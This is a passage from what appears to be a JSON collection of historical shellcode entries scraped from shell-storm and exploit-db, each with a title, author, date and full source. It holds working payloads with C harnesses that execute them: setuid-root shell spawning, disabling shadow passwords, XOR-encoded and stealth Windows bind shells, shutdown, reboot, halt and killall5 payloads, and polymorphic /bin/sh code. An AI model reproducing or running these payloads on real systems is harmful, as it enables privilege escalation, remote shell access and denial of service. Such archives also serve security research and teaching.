"\t\t\t\"\\x8a\\xe3\\x54\\x8a\\xe2\\xb1\\x0c\\xce\"", "\t\t\t\"\\x81\";", "", "", "int main()", "{", "        fprintf(stdout,\"Length: %d\\n\",strlen(shellcode));", "        (*(void(*)()) shellcode)();", "", "return 0;", "}", "", "// milw0rm.com [2009-06-29]"]},
{"Title": "Linux/x86 - Disable Shadowing Shellcode (42 bytes)", "Author": "vlan7", "Published": ": 2009-07-04", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-465.php", "View": null, "code": ["#include <stdio.h>", "", "const char sc[]= \"\\x31\\xdb\" //xor ebx,ebx", "                 \"\\x8d\\x43\\x17\" //LEA eax,[ebx + 0x17] /LEA is FASTER than push and pop!", "                 \"\\x99\" //cdq", "                 \"\\xcd\\x80\" //int 80 //setuid(0) shouldn't returns -1 right? ;)", "                 \"\\xb0\\x0b\" //mov al,0bh", "                 \"\\x52\" //push edx /Termina la cadena con un 0", "                 \"\\x68\\x63\\x6f\\x6e\\x76\" //push dword \"conv\"", "                 \"\\x68\\x70\\x77\\x75\\x6e\" //push dword \"pwun\"", "                 \"\\x68\\x62\\x69\\x6e\\x2f\" //push dword \"bin/\"", "                 \"\\x68\\x73\\x72\\x2f\\x73\" //push dword \"sr/s\"", "                 \"\\x68\\x2f\\x2f\\x2f\\x75\" //push dword \"///u\"", "                 \"\\x89\\xe3\" //mov ebx,esp", "                 \"\\x89\\xd1\" //mov ecx,edx", "                 \"\\xcd\\x80\"; //int 80h", "", "void main()", "{", "  printf(\"\\n~ This shellcode disables shadowing on a linux system ~\"", "         \"\\n\\n\\t ~ Coded by vlan7 ~\"", "         \"\\n\\t ~ http://vlan7.blogspot.com ~\"", "         \"\\n\\n ~ Date: 4/Jul/2009\"", "", "         \"\\n\\tYou'll have the passwords stored in /etc/passwd.\"", "\t\t \"\\n\\tFor undo purposes use the pwconv command.\"", "         \"\\n\\t ~ Cheers go to: Wadalbertia\"", "         \"\\n\\t ~ Shellcode Size: %d bytes\\n\\n\",", "                sizeof(sc)-1);", "", "        (*(void (*)()) sc)();", "}"]},
{"Title": "Linux/x86 - setuid(0) + execve(/bin/sh) Shellcode (27 bytes)", "Author": "vlan7", "Published": ": 2009-07-04", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-466.php", "View": null, "code": ["#include <stdio.h>", "", "const char sc[]= \"\\x31\\xdb\" //xor ebx,ebx", "                 \"\\x8d\\x43\\x17\" //LEA eax,[ebx + 0x17] /LEA is FASTER tha push/pop", "                 \"\\x99\" //cdq", "                 \"\\xcd\\x80\" //int 80 //setuid(0) shouldn't returns -1 right? ;)", "                 \"\\xb0\\x0b\" //mov al,0bh", "                 \"\\x52\" //push edx /Termina la cadena //bin/sh con un 0", "                 \"\\x68\\x6e\\x2f\\x73\\x68\"", "                 \"\\x68\\x2f\\x2f\\x62\\x69\"", "                 \"\\x89\\xe3\" //mov ebx,esp", "                 \"\\x89\\xd1\" //mov ecx,edx", "                 \"\\xcd\\x80\"; //int 80h", "", "int main()", "{", "  printf(\"\\nSMALLEST SETUID & EXECVE GNU/LINUX x86 STABLE SHELLCODE \"", "        \"WITHOUT NULLS THAT SPAWNS A SHELL\"", "                        \"\\n\\nCoded by vlan7\"", "                        \"\\n\\t + vlan7[at]bigfoot.com\"", "                        \"\\n\\t + http://vlan7.blogspot.com\"", "                        \"\\n\\n[+] Date: 4/Jul/2009\"", "                        \"\\n[+] Thanks to: sch3m4. He initiated the funny game.\"", "                        \"\\n\\n[+] Shellcode Size: %d bytes\\n\\n\",", "                        sizeof(sc)-1);", "        (*(void (*)()) sc)();", "        return 0;", "}"]},
{"Title": "Linux/x86 - Bind (4444/TCP) Shell (/bin/sh) + XOR Encoded Shellcode (152 bytes)", "Author": "Rick", "Published": ": 2009-07-10", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-481.php", "View": null, "code": ["/* ", "       Author: Rick", "       Email: rick2600@hotmail.com", "", "       OS: Linux/x86", "       Description: Port Bind 4444 ( xor-encoded )", "", "", "--------------------------------------------------------------------", "section .text", "    global _start", "", "_start:", "", "    ;socket (PF_INET, SOCK_STREAM, 0)", "    push byte 0x66      ", "    pop eax", "    push byte 0x01", "    pop ebx", "    xor ecx, ecx", "    push ecx", "    push byte 0x01", "    push byte 0x02", "    mov ecx, esp", "    int 0x80", "    ", "    mov esi, eax\t;save file descriptor", "    ", "    ;bind (sockfd, server, len)", "    xor edx, edx", "    push edx", "    push word 0x5c11", "    push word 0x02", "    mov ecx, esp", "    push byte 0x10", "    push ecx", "    push eax", "    mov ecx, esp", "    mov bl, 0x02", "    push byte 0x66", "    pop eax", "    int 0x80", "    ", "    ;listen", "    mov al, 0x66", "    mov bl, 0x04", "    int 0x80", "    ", "    ;accept", "    push edx", "    push esi ", "    mov ecx, esp", "    inc ebx", "    push byte 0x66", "    pop eax", "    int 0x80", "    ", "    mov ebx, eax\t;save file descriptor", "    ", "    ;dup2(sockfd, 2); dup2(sockfd, 1); dup2(sockfd, 0)", "    push byte 0x02", "    pop ecx", "    do_dup:", "        push byte 0x3f", "        pop eax", "        int 0x80", "    loop do_dup", "        push byte 0x3f", "        pop eax", "        int 0x80", "    ", "    ", "    ; execve (\"/bin/sh\", [\"/bin/sh\", \"-i\"], 0);", "    xor edx, edx", "    push edx", "    push 0x68732f6e", "    push 0x69622f2f", "    mov ebx, esp", "    push edx", "    push word 0x692d", "    mov ecx, esp", "    push edx", "    push ecx", "    push ebx", "    mov ecx, esp", "    push byte 0x0b", "    pop eax", "    int 0x80", "    ", "    ;exit(0)", "    push byte 0x01", "    pop eax", "    xor ebx, ebx", "    int 0x80", "--------------------------------------------------------------------", "*/", "                        ", "#include <stdio.h>", "#include <string.h>", "", "", "", "char code[] =", "\"\\xeb\\x12\\x5b\\x31\\xc9\\xb1\\x75\\x8a\\x03\\x34\"", "\"\\x1e\\x88\\x03\\x43\\x66\\x49\\x75\\xf5\\xeb\\x05\"", "\"\\xe8\\xe9\\xff\\xff\\xff\\x74\\x78\\x46\\x74\\x1f\"", "\"\\x45\\x2f\\xd7\\x4f\\x74\\x1f\\x74\\x1c\\x97\\xff\"", "\"\\xd3\\x9e\\x97\\xd8\\x2f\\xcc\\x4c\\x78\\x76\\x0f\"", "\"\\x42\\x78\\x76\\x1c\\x1e\\x97\\xff\\x74\\x0e\\x4f\"", "\"\\x4e\\x97\\xff\\xad\\x1c\\x74\\x78\\x46\\xd3\\x9e\"", "\"\\xae\\x78\\xad\\x1a\\xd3\\x9e\\x4c\\x48\\x97\\xff\"", "\"\\x5d\\x74\\x78\\x46\\xd3\\x9e\\x97\\xdd\\x74\\x1c\"", "\"\\x47\\x74\\x21\\x46\\xd3\\x9e\\xfc\\xe7\\x74\\x21\"", "\"\\x46\\xd3\\x9e\\x2f\\xcc\\x4c\\x76\\x70\\x31\\x6d\"", "\"\\x76\\x76\\x31\\x31\\x7c\\x77\\x97\\xfd\\x4c\\x78\"", "\"\\x76\\x33\\x77\\x97\\xff\\x4c\\x4f\\x4d\\x97\\xff\"", "\"\\x74\\x15\\x46\\xd3\\x9e\\x74\\x1f\\x46\\x2f\\xc5\"", "\"\\xd3\\x9e\";", "", "", "", "int main(void)", "{", "   printf(\"length: %d\\n\", strlen(code));", "   ", "   void (*shellcode)();", "   shellcode = (void *)code;", "   shellcode();", "   return (0);", "    ", "}", "", "// milw0rm.com [2009-07-10]"]},
{"Title": "Linux/x86 - execve(/sbin/shutdown,/sbin/shutdown 0) Shellcode (36 bytes)", "Author": "TheWorm", "Published": ": 2009-07-11", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-476.php", "View": null, "code": ["#include <stdio.h>", "", "const char shellcode[]=", "\t\"\\x6a\\x0b\"\t\t// push\t$0xb", "\t\"\\x58\"\t\t\t// pop\t%eax", "\t\"\\x99\"\t\t\t// cltd", "\t\"\\x52\"\t\t\t// push\t%edx", "\t\"\\x68\\x64\\x6f\\x77\\x6e\"\t// push\t$0x6e776f64", "\t\"\\x68\\x73\\x68\\x75\\x74\"\t// push\t$0x74756873", "\t\"\\x68\\x69\\x6e\\x2f\\x2f\"\t// push\t$0x2f2f6e69", "\t\"\\x68\\x2f\\x2f\\x73\\x62\"\t// push\t$0x62732f2f", "\t\"\\x89\\xe3\"\t\t// mov\t%esp,%ebx", "\t\"\\x52\"\t\t\t// push\t%edx", "\t\"\\x6a\\x30\"\t\t// push\t$0x30", "\t\"\\x52\"\t\t\t// push\t%edx", "\t\"\\x53\"\t\t\t// push\t%ebx", "\t\"\\x89\\xe1\"\t\t// mov\t%esp,%ecx", "\t\"\\xcd\\x80\";\t\t// int\t$0x80", "", "int main()", "{", "\tprintf\t(\"\\n[+] Linux/x86 execve(/sbin/shutdown,/sbin/shutdown 0)\"", "\t\t\"\\n[+] Date: 11/07/2009\"", "\t\t\"\\n[+] Author: TheWorm\"", "\t\t\"\\n\\n[+] Shellcode Size: %d bytes\\n\\n\", sizeof(shellcode)-1);", "\t(*(void (*)()) shellcode)();", "\treturn 0;", "}"]},
{"Title": "Linux/x86 - execve(/sbin/reboot,/sbin/reboot) Shellcode (28 bytes)", "Author": "TheWorm", "Published": ": 2009-07-11", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-477.php", "View": null, "code": ["#include <stdio.h>", "", "const char shellcode[]=", "\t\"\\x6a\\x0b\"\t\t// push\t$0xb", "\t\"\\x58\"\t\t\t// pop\t%eax", "\t\"\\x99\"\t\t\t// cltd", "\t\"\\x52\"\t\t\t// push\t%edx", "\t\"\\x68\\x62\\x6f\\x6f\\x74\"\t// push\t$0x746f6f62", "\t\"\\x68\\x6e\\x2f\\x72\\x65\"\t// push\t$0x65722f6e", "\t\"\\x68\\x2f\\x73\\x62\\x69\"\t// push\t$0x6962732f", "\t\"\\x89\\xe3\"\t\t// mov\t%esp,%ebx", "\t\"\\x52\"\t\t\t// push\t%edx", "\t\"\\x53\"\t\t\t// push\t%ebx", "\t\"\\x89\\xe1\"\t\t// mov\t%esp,%ecx", "\t\"\\xcd\\x80\";\t\t// int\t$0x80", "", "int main()", "{", "\tprintf\t(\"\\n[+] Linux/x86 execve(/sbin/reboot,/sbin/reboot)\"", "\t\t\"\\n[+] Date: 11/07/2009\"", "\t\t\"\\n[+] Author: TheWorm\"", "\t\t\"\\n\\n[+] Shellcode Size: %d bytes\\n\\n\", sizeof(shellcode)-1);", "\t(*(void (*)()) shellcode)();", "\treturn 0;", "}"]},
{"Title": "Linux/x86 - execve(/sbin/halt,/sbin/halt) Shellcode (27 bytes)", "Author": "TheWorm", "Published": ": 2009-07-11", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-483.php", "View": null, "code": ["#include <stdio.h>", "", "const char shellcode[]=", "\t\"\\x6a\\x0b\"\t\t// push\t$0xb", "\t\"\\x58\"\t\t\t// pop\t%eax", "\t\"\\x99\"\t\t\t// cltd", "\t\"\\x52\"\t\t\t// push\t%edx", "\t\"\\x66\\x68\\x6c\\x74\"\t// pushw $0x746c", "\t\"\\x68\\x6e\\x2f\\x68\\x61\"\t// push\t$0x61682f6e", "\t\"\\x68\\x2f\\x73\\x62\\x69\"\t// push\t$0x6962732f", "\t\"\\x89\\xe3\"\t\t// mov\t%esp,%ebx", "\t\"\\x52\"\t\t\t// push\t%edx", "\t\"\\x53\"\t\t\t// push\t%ebx", "\t\"\\x89\\xe1\"\t\t// mov\t%esp,%ecx", "\t\"\\xcd\\x80\";\t\t// int\t$0x80", "", "int main()", "{", "\tprintf\t(\"\\n[+] Linux/x86 execve(/sbin/halt,/sbin/halt)\"", "\t\t\"\\n[+] Date: 11/07/2009\"", "\t\t\"\\n[+] Author: TheWorm\"", "\t\t\"\\n\\n[+] Shellcode Size: %d bytes\\n\\n\", sizeof(shellcode)-1);", "\t(*(void (*)()) shellcode)();", "\treturn 0;", "}"]},
{"Title": "Windows/x86 (XP SP2) (English) - cmd.exe Shellcode (23 bytes)", "Author": "Stack", "Published": ": 2009-07-17", "Platform": "Windows_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-482.php", "View": null, "code": ["/*", "win32/xp sp2 (En) cmd.exe 23 bytes", "Author : Mountassif Moad", "A.K.A : Stack", "Description : It's a 23 Byte Shellcode which Execute Cmd.exe Tested Under Windows Xp SP2 En", "", "get the following if we disassemle this code compiled with olly debugger", " ", "00402000  > 8BEC             MOV EBP,ESP", "00402002  . 68 65786520      PUSH 20657865", "00402007  . 68 636D642E      PUSH 2E646D63", "0040200C  . 8D45 F8          LEA EAX,DWORD PTR SS:[EBP-8]", "0040200F  . 50               PUSH EAX", "00402010  . B8 8D15867C      MOV EAX,kernel32.WinExec", "00402015  . FFD0             CALL EAX", "*/", "#include <stdio.h>", "unsigned char shellcode[] =", "                        \"\\x8b\\xec\\x68\\x65\\x78\\x65\"", "                        \"\\x20\\x68\\x63\\x6d\\x64\\x2e\"", "                        \"\\x8d\\x45\\xf8\\x50\\xb8\\x8D\"", "                        \"\\x15\\x86\\x7C\\xff\\xd0\";", "int main ()", "{", "int *ret;", "ret=(int *)&ret+2;", "printf(\"Shellcode Length is : %d\\n\",strlen(shellcode));", "(*ret)=(int)shellcode;", "return 0;", "}", "", "// milw0rm.com [2009-07-17]"]},
{"Title": "Windows/x86 (5.0 < 7.0) - Bind (28876/TCP) Shell + Null-Free Shellcode", "Author": "Skylined", "Published": ": 2009-07-27", "Platform": "Windows_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-484.php", "View": null, "code": ["BITS 32", "; Windows x86 null-free bindshell for Windows 5.0-7.0 all service packs.", "; (See http://skypher.com/wiki/index.php/Hacking/Shellcode/Bind/NGS).", "; Based largely on code and ideas (C) 2005 by Dafydd Stuttard, NGS Software.", "; (See http://www.ngssoftware.com/papers/WritingSmallShellcode.pdf).", "; Thanks to Pete Beck.", ";", "; Features both in this and the original code:", ";  + NULL Free", ";  + Windows version and service pack independant.", "; Improvements of this code over the original:", ";  + No assumptions are made about the values of registers.", ";  + \"/3GB\" compatible: pointers are not assume to be smaller than 0x80000000.", ";  + DEP/ASLR compatible: data is not executed, code is not modified.", ";  + Windows 7 compatible: kernel32 is found based on the length of its name.", ";  + Stealth: does not display a console windows on the target machine when ", ";    cmd.exe is executed.", ";  + Allows an unlimited number of consecutive connections.", ";  + Can except connections on almost any port. The range of acceptable port", ";    numbers is only limited by the fact that the negative value of the port", ";    number must not contain nulls.", "", "port equ 28876                          ; The port number to bind to.", "", "%if ((-port & 0xFF) == 0) || (-port & 0xFF00 == 0)", "  %error The given port number would result in NULLs in the code :(", "%endif", "", "AF_INET                                 equ 2", "", "; These hashes are calculated with a separate tool.", "hash_xor_value                          equ 0x71", "hash_start_value                        equ 0x36", "hash_kernel32_CreateProcessA            equ 0xB7", "hash_kernel32_LoadLibraryA              equ 0x8F", "hash_ws2_32_WSAStartup                  equ 0x09", "hash_ws2_32_WSASocketA                  equ 0x98", "hash_ws2_32_bind                        equ 0x66", "hash_ws2_32_listen                      equ 0x56", "hash_ws2_32_accept                      equ 0x77", "sizeof_proc_address_table               equ 7 * 4", "offset_WSAStartup_in_hash_table         equ 2", "offset_accept_in_hash_table             equ 6", "", "%define B2W(b1,b2)                      (((b2) << 8) + (b1))", "%define W2DW(w1,w2)                     (((w2) << 16) + (w1))", "%define B2DW(b1,b2,b3,b4)               (((b4) << 24) + ((b3) << 16) + ((b2) << 8) + (b1))", "", "start:", "    XOR     ECX, ECX                    ; ECX = 0", "; Find base address of kernel32.dll. This code should work on Windows 5.0-7.0", "    MOV     ESI, [FS:ECX + 0x30]        ; ESI = &(PEB) ([FS:0x30])", "    MOV     ESI, [ESI + 0x0C]           ; ESI = PEB->Ldr", "    MOV     ESI, [ESI + 0x1C]           ; ESI = PEB->Ldr.InInitOrder (first module)", "next_module:", "    MOV     EBP, [ESI + 0x08]           ; EBP = InInitOrder[X].base_address", "    MOV     EDI, [ESI + 0x20]           ; EDI = InInitOrder[X].module_name (unicode string)", "    MOV     ESI, [ESI]                  ; ESI = InInitOrder[X].flink (next module)", "    CMP     [EDI + 12*2], CL            ; modulename[12] == 0 ? strlen(\"kernel32.dll\") == 12", "    JNE     next_module                 ; No: try next module.", "", "; Create hash table and \"ws2_32\" (for LoadLibraryA) on the stack:", "    PUSH    ECX                         ; Stack = 00 00 00 00", "    PUSH    B2DW('2', '_', '3', '2')    ; Stack = \"s2_32\"", "%if (hash_ws2_32_accept != 'w')", "  %error The hash for ws2_32.accept is not a 'w'", "%endif", "    PUSH    B2DW(hash_ws2_32_bind, hash_ws2_32_listen, hash_ws2_32_accept, 's') ; hash, hash, \"ws2_32\"", "end_of_hash_table_marker                equ 's'", "    PUSH    B2DW(hash_kernel32_CreateProcessA, hash_kernel32_LoadLibraryA, hash_ws2_32_WSAStartup, hash_ws2_32_WSASocketA)", "sizeof_hash_table                       equ 7", "    MOV     ESI, ESP                    ; ESI -> Hash table", "; Reserve space for WSADATA", "    MOV     CH, 0x3                     ; ECX = 0x300", "    SUB     ESP, ECX                    ; Reserve space for WSADATA", "; Create a bunch of NULLs on the stack", "    SUB     ESP, ECX                    ; Reserve space for NULLs", "    MOV     EDI, ESP                    ; EDI = &(NULLs)", "    SALC                                ; AL = 0", "    REP STOSB                           ;", "; Prepare arguments for various functions on the stack:", "; WSASocket(__in int af=2, __in int type=1, __in int protocol=0,", ";            __in LPWSAPROTOCOL_INFO lpProtocolInfo=0, __in GROUP g=0, ", ";            __in DWORD dwFlags=0)", "                                        ; __in LPWSAPROTOCOL_INFO lpProtocolInfo=0", "                                        ; __in GROUP g=0", "                                        ; __in DWORD dwFlags=0", "                                        ; __in int protocol=0", "    INC     ECX                         ;", "    PUSH    ECX                         ; __in int type = SOCK_STREAM (1)", "    INC     ECX                         ;", "    PUSH    ECX                         ; __in int af = AF_INET (2)", "; WSAStartup(__in WORD wVersionRequested=2, __out LPWSADATA lpWSADATa=stack)", "    PUSH    EDI                         ; __out LPWSADATA lpWSAData = &(WSADATA)", "    PUSH    ECX                         ; __in WORD wVersionRequested = 2 (2.0)", "; Set up EDI so that a proc addresses table can be created in the NULLs,", "; followed by sufficient space to store a struct sockaddr_in:", "    SUB     EDI, BYTE sizeof_proc_address_table + sizeof_sockaddr_in", "", "get_proc_address_loop:", "    MOVSB                               ; [EDI] = hash", "    DEC     EDI                         ; Restore EDI", "; Find the PE header and export and names tables of the module:", "    MOV     EBX, [EBP + 0x3C]           ; EBX = &(PE header)", "    MOV     EBX, [EBP + EBX + 0x78]     ; EBX = offset(export table)", "    ADD     EBX, EBP                    ; EBX = &(export table)", "    MOV     ECX, [EBX + 0x20]           ; ECX = offset(names table)", "    ADD     ECX, EBP                    ; ECX = &(names table)", "    PUSH    ESI                         ; Save ESI", "; Hash each function name and check it against the requested hash:", "    XOR     EDX, EDX                    ; EDX = function number (0)", "next_function_loop:", "; Get the next function name:", "    INC     EDX                         ; Increment function number", "    MOV     ESI, [ECX + EDX * 4]        ; ESI = offset(function name)", "    ADD     ESI, EBP                    ; ESI = &(function name)", "    MOV     AH, hash_start_value        ; Initialize the hash", "hash_loop:", "; Hash the function name:", "    LODSB                               ; Load a character of the function name", "    XOR     AL, hash_xor_value          ; Calculate a hash", "    SUB     AH, AL                      ;", "    CMP     AL, hash_xor_value          ; Is this the terminating 0 byte?", "    JNE     hash_loop                   ; No: continue hashing", "    CMP     AH, [EDI]                   ; Yes: Does the hash match ?", "; Check if the hash matches and loop if not:", "    JNZ     next_function_loop", "    POP     ESI                         ; Restore ESI", "; Find the address of the requested function:", "    MOV     ECX, [EBX + 0x24]           ; ECX = offset ordinals table", "    ADD     ECX, EBP                    ; ECX = &oridinals table", "    MOVZX   EDX, WORD [ECX + 2 * EDX]   ; EDX = ordinal number of function", "    MOV     ECX, [EBX + 0x1C]           ; ECX = offset address table", "    ADD     ECX, EBP                    ; ECX = &address table", "    MOV     EAX, EBP                    ; EAX = &(module)", "    ADD     EAX, [ECX + 4 * EDX]        ; EAX = &(function)", "; Save the address of the requested function:", "    STOSD                               ; Save proc address", "; When needed, call LoadLibraryA to start looking for ws2_32.dll functions:", "    CMP     BYTE [ESI], hash_ws2_32_WSAStartup ; We just found LoadLibraryA", "    JNE     skip_load_library           ;", "    LEA     EBX, [ESI - offset_WSAStartup_in_hash_table + offset_accept_in_hash_table]", "    PUSH    EBX                         ; __in LPCTSTR lpFileName = &(\"ws2_32\")", "    CALL    EAX                         ; LoadLibraryA(&\"ws2_32\") ", "    PUSH    EDI                         ; Save proc address table[WSAStartup]", "    XCHG    EAX, EBP                    ; EBP = &(ws2_32.dll)", "skip_load_library:", "; Continue until all hashes have been found:", "    CMP     BYTE [ESI], end_of_hash_table_marker", "    JNE     get_proc_address_loop       ;", "    POP     ESI", "; Call WSAStartup (Arguments are already on the stack)", "    LODSD", "    CALL    EAX                         ; WSASTARTUP", "; Call WSASocket (Arguments are already on the stack)", "    LODSD", "    CALL    EAX", "    XCHG    EAX, EBP                    ; EBP = Server socket", "", "; Create a struct sockaddr_in on the stack for use by bind()", "sizeof_sockaddr_in equ 2 + 2 + 4 + 8", "    SUB     DWORD [EDI], -W2DW( AF_INET, B2W(port >> 8, port & 0xFF)); sin_family = AF_INET, sin_port = (port, little endian!)", "; Set up the 2nd and 3rd argument for bind:", ";   bind(__in SOCKET s=(added later), __in const struct sockaddr *name, __in int namelen)", "    PUSH    BYTE 0x10                   ; __in int namelen = 0x10", "    PUSH    EDI                         ; __in const struct sockaddr *name = &(sockaddr_in)", "; bind(), listen() and accept() all take the server socket as their first", "; argument. listen() and accept() only need NULLs for the remaining arguments", "; and the arguments for bind() are already on the stack. Because bind() and ", "; accept() return 0 and listen() returns a socket, which is not 0, a loop can be", "; used to call them:", ";   listen(__in SOCKET s=(added later), __in int backlog=0)", ";   accept(__in SOCKET s=(added later), __in struct sockaddr *addr=0, __inout int *addrlen=0)", "call_loop:", "    LODSD", "accept_loop:", "    PUSH    EBP                         ; __in SOCKET s = Server socket descriptor", "    CALL    EAX", "; Check if accept() has returned a socket:", "    TEST    EAX, EAX", "    JZ      call_loop", "", "; Create structures on the stack for CreateProcessA", "; STARTUPINFO {", ";   DWORD cb                            00-03: >= sizeof(STARTUPINFO)", ";   LPTSTR lpReserved                   04-07: 0", ";   LPTSTR lpDesktop                    08-0B: 0", ";   LPTSTR lpTitle                      0C-0F: 0", ";   DWORD dwX                           10-13: 0", ";   DWORD dwY                           14-17: 0", ";   DWORD dwXSize                       18-1B: 0", ";   DWORD dwYSize                       1C-1F: 0", ";   DWORD dwXCountChars                 20-23: 0", ";   DWORD dwYCountChars                 24-27: 0", ";   DWORD dwFillAttribute               28-2B: 0", ";   DWORD dwFlags                       2C-2F: (STARTF_USESTD_HANDLES 0x100)", ";   WORD wShowWindow                    30-31: 0", ";   WORD cbReserved2                    32-33: 0", ";   LPBYTE lpReserved2                  34-37: 0", ";   HANDLE hStdInput                    38-3B: (Socket descriptor)", ";   HANDLE hStdOutput                   3C-3F: (Socket descriptor)", ";   HANDLE hStdError                    40-43: (Socket descriptor)", "; }", "sizeof_STARTUPINFO                      equ 0x44", "offset_dwFlags_in_STARTUPINFO           equ 0x2C", "offset_hStdInput_in_STARTUPINFO         equ 0x38", "; Each call to accept() removes two DWORDS off the stack. These must be put back", "; or ESP will run off the stack eventually:", "    XOR     EDX, EDX                    ; EDX = 0", "    PUSH    EDX                         ; Restore stack #1", "; We'll also create a struct STARTUPINFO", "    PUSH    B2DW('c', 'm', 'd', ' ')    ; Restore stack #2 and STARTUPINFO.cb = \"cmd \" (> 0)", "    LEA     EDI, [ESP + offset_hStdInput_in_STARTUPINFO]; EDI = &(STARTUPINFO.hStdInput)", "    STOSD                               ; STARTUPINFO.hStdInput = Socket descriptor", "    STOSD                               ; STARTUPINFO.hStdOutput = Socket descriptor", "    STOSD                               ; STARTUPINFO.hStdError = Socket descriptor", "    MOV     BYTE [EDI - sizeof_STARTUPINFO + offset_dwFlags_in_STARTUPINFO + 1], 1 ; STARTUPINFO.dwFlags = STARTF_USESTDHANDLES (0x100)", "; CreateProcess(...)", "    PUSH    ESP                         ; __out LPPROCESS_INFORMATION lpProcessInformation == &(STARTUPINFO)", "    XCHG    [ESP], EDI                  ; __out LPPROCESS_INFORMATION lpProcessInformation == &(STARTUPINFO) + sizeof(STARTUPINFO)", "    PUSH    EDI                         ; __in LPSTARTUPINFO lpStartupInfo == &(STARTUPINFO)", "    PUSH    EDX                         ; __in_opt LPCTSTR lpCurrentDirectory = NULL", "    PUSH    EDX                         ; __in_opt LPVOID lpEnvironment = NULL", "    PUSH    EDX                         ; __in DWORD dwCreationFlags = 0", "    MOV     BYTE [EDI-5*4+3], 0x8       ; __in DWORD dwCreationFlags = CREATE_NO_WINDOW (0x08000000)", "    PUSH    EDI                         ; __in BOOL bInheritHandles = TRUE (>0)", "    PUSH    EDX                         ; __in_opt LPSECURITY_ATTRIBUTES lpThreadAttributes = NULL", "    PUSH    EDX                         ; __in_opt LPSECURITY_ATTRIBUTES lpProcessAttributes = NULL", "    PUSH    EDI                         ; __inout_opt LPTSTR lpCommandLine = &(\"cmd \")", "    PUSH    EDX                         ; __in_opt LPCTSTR lpApplicationName = NULL", "    CALL    [ESI - sizeof_proc_address_table]", "; Load accept() into EAX and jump back into our code.", "    MOV     EAX, [ESI - 4]", "    JMP     accept_loop", "", "; milw0rm.com [2009-07-27]"]},
{"Title": "Linux/x86 - killall5 + Polymorphic Shellcode (61 bytes)", "Author": "Jonathan Salwan", "Published": ": 2009-08-11", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13311.c", "View": "https://old.exploit-db.com/raw/13311/", "code": ["/*", "   Title:\tLinux x86 | Polymorphic Shellcode killall5 - 61 bytes", "   Author: \tJonathan Salwan", "   Mail:\tsubmit [!] shell-storm.org", "   ", "\t! DataBase of shellcode ==> http://www.shell-storm.org/shellcode/", "", "", "   killall5 is the SystemV killall command. It sends a signal to all processes ", "   except the processes in its own session, so it won't kill the shell that is ", "   running the script it was called from. Its primary (only) use is in the rc ", "   scripts found in the /etc/init.d directory.", "", "", " Original Informations", " =====================", "", " Disassembly of section .text:", "", " 08048054 <.text>:", " 8048054:       31 c0                   xor    %eax,%eax", " 8048056:       50                      push   %eax", " 8048057:       66 68 6c 35             pushw  $0x356c", " 804805b:       68 6c 6c 61 6c          push   $0x6c616c6c", " 8048060:       68 6e 2f 6b 69          push   $0x696b2f6e", " 8048065:       68 2f 73 62 69          push   $0x6962732f", " 804806a:       89 e3                   mov    %esp,%ebx", " 804806c:       50                      push   %eax", " 804806d:       89 e2                   mov    %esp,%edx", " 804806f:       53                      push   %ebx", " 8048070:       89 e1                   mov    %esp,%ecx", " 8048072:       b0 0b                   mov    $0xb,%al", " 8048074:       cd 80                   int    $0x80", "", "*/", "", "#include \"stdio.h\"", "", "int main(int argc, char *argv[])", "{", "", "char shellcode[] =\t", "", "\t\t\t\"\\xeb\\x11\\x5e\\x31\\xc9\\xb1\\x37\\x80\"", "\t\t\t\"\\x6c\\x0e\\xff\\x01\\x80\\xe9\\x01\\x75\"", "  \t\t\t\"\\xf6\\xeb\\x05\\xe8\\xea\\xff\\xff\\xff\"\t\t", "\t\t\t\"\\x32\\xc1\\x51\\x67\\x69\\x6d\\x36\\x69\"", "\t\t\t\"\\x6d\\x6d\\x62\\x6d\\x69\\x6f\\x30\\x6c\"", "\t\t\t\"\\x6a\\x69\\x30\\x74\\x63\\x6a\\x8a\\xe4\"", "\t\t\t\"\\x51\\x8a\\xe3\\x54\\x8a\\xe2\\xb1\\x0c\"", "\t\t\t\"\\xce\\x81\\x41\\xce\\x81\";", "", "\tprintf(\"Length: %d\\n\",strlen(shellcode));", "\t(*(void(*)()) shellcode)();", "\t", "\treturn 0;", "}", "", "// milw0rm.com [2009-08-11]"]},
{"Title": "Linux/x86 - execve(/bin/sh) + Polymorphic Shellcode (48 bytes)", "Author": "Jonathan Salwan", "Published": ": 2009-08-11", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-491.php", "View": null, "code": ["/*", "", " Title: \tPolymorphic Shellcode /bin/sh - 48 bytes", " Author: \tJonathan Salwan", " Mail:\t\tsubmit [!] shell-storm.org ", "", " \t! DataBase of shellcode : http://www.shell-storm.org/shellcode/", "", "", " Original Informations", " =====================", "", " Disassembly of section .text:", "", "  08048060  <.text>:", "  8048060:\t 31 c0                \t xor    %eax,%eax", "  8048062:\t 50                   \t push   %eax", "  8048063:\t 68 2f 2f 73 68       \t push   $0x68732f2f", "  8048068:\t 68 2f 62 69 6e       \t push   $0x6e69622f", "  804806d:\t 89 e3                \t mov    %esp,%ebx", "  804806f:\t 50                   \t push   %eax", "  8048070:\t 53                   \t push   %ebx", "  8048071:\t 89 e1                \t mov    %esp,%ecx", "  8048073:\t 99                   \t cltd   ", "  8048074:\t b0 0b                \t mov    $0xb,%al", "  8048076:\t cd 80                \t int    $0x80", "", "", "*/", "", "#include \"stdio.h\"", "", "char shellcode[] = \t\"\\xeb\\x11\\x5e\\x31\\xc9\\xb1\\x32\\x80\"", "\t\t\t\"\\x6c\\x0e\\xff\\x01\\x80\\xe9\\x01\\x75\"", "  \t\t\t\"\\xf6\\xeb\\x05\\xe8\\xea\\xff\\xff\\xff\"", "\t\t\t\"\\x32\\xc1\\x51\\x69\\x30\\x30\\x74\\x69\"", "\t\t\t\"\\x69\\x30\\x63\\x6a\\x6f\\x8a\\xe4\\x51\"", "\t\t\t\"\\x54\\x8a\\xe2\\x9a\\xb1\\x0c\\xce\\x81\";", "", "int main()", "{", "\tprintf(\"Polymorphic Shellcode - length: 